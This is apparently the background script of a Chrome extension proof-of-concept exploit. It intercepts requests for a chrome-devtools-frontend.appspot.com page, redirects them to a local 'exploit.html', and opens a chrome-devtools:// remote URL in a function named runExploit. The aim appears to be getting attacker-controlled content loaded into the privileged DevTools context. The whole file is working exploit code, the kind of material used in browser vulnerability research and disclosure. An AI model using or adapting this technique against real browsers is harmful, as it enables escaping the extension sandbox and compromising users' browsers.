'use strict';

chrome.webRequest.onBeforeRequest.addListener(function(details) {
    return { redirectUrl : chrome.runtime.getURL('exploit.html') };
}, {
    urls: ['https://chrome-devtools-frontend.appspot.com/x.html'],
    types: ['other'],
}, ['blocking']);

runExploit();

function runExploit() {
    chrome.tabs.create({
        url: 'chrome-devtools://devtools/remote/x.html',
    });
}
